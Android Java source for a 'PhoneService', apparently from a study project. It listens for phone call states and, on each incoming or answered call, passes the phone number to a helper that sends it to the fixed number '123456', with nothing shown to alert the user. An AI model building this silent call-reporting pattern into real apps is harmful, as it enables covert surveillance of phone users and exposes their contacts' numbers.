package com.example.lxhstudy.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;

import com.example.lxhstudy.util.MessageSendUtil;

public class PhoneService extends Service {
    private TelephonyManager manager;
    private String outgoingNumber;
    private Intent intent;

    @Override
    public void onCreate() {
        super.onCreate();
        manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        manager.listen(new PhoneStateListenerImpl(), PhoneStateListener.LISTEN_CALL_STATE);   //设置监听操作
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        outgoingNumber = intent.getStringExtra("outgoingNumber");
        this.intent = intent;
    }

    private class PhoneStateListenerImpl extends PhoneStateListener {
        @Override
        public void onCallStateChanged(int state, String phoneNumber) {
            Log.i("WeiSir", "接入电话: " + phoneNumber);
            super.onCallStateChanged(state, phoneNumber);
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:      //挂断电话
                    break;
                case TelephonyManager.CALL_STATE_RINGING:    //响铃
                    MessageSendUtil util = new MessageSendUtil(PhoneService.this, intent);
                    util.send("123456",phoneNumber,"拨入");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:     //接听电话
                    MessageSendUtil util1 = new MessageSendUtil(PhoneService.this, intent);
                    util1.send("123456",outgoingNumber,"接听");
                    break;
            }
        }
    }

}
